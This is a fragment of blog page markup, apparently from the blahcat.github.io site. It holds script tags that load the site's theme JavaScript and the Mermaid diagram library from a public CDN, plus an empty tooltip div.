src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>